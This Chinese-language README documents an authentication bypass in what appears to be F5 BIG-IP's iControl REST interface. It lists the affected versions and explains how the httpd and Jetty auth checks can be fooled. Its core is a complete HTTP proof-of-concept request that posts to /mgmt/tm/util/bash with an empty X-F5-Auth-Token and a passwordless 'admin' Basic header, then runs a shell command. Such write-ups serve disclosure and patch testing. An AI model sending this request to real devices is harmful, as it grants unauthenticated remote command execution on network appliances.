# README

## 影响范围

```java
16.0.0-16.0.1
15.1.0-15.1.2
14.1.0-14.1.3.1
13.1.0-13.1.3.5
12.1.0-12.1.5.2
```

## POC

```http
POST /mgmt/tm/util/bash HTTP/1.1
Host: 192.168.142.145
Content-Type: application/json
User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Authorization: Basic YWRtaW46
X-F5-Auth-Token:
Content-Length: 43

{"command":"run","utilCmdArgs":"-c whoami"}
```



## 简单的分析

因为官网没有给具体的源码，需要在镜像中把源码按照参考链接里的文章中的一些思路从虚拟机中弄出来(我用的是scp命令)。

然后这个f5的代码分析起来也有点麻烦，所以直接列一下简单的思路了。

并且实现攻击有2种方式，我只记录绕过认证这种方式。

httpd.conf中的配置说明转发给810端口的Jetty服务的时候apache httpd会进行一次认证，具体认证的代码需要逆向，逻辑就是看请求头是否有`X-F5-Auth-Token`，有的话则交给Jetty处理。

而Jetty在`X-F5-Auth-Token`为空时只会判断`userReference` 是否为空，以及 `userReference` 是否为 `admin的userReference` 。

而这部分处理只需要让`Authorization: Basic YWRtaW46`的username 为admin即可。

这样就可以实现认证的绕过。

## 参考链接

https://nosec.org/home/detail/4722.html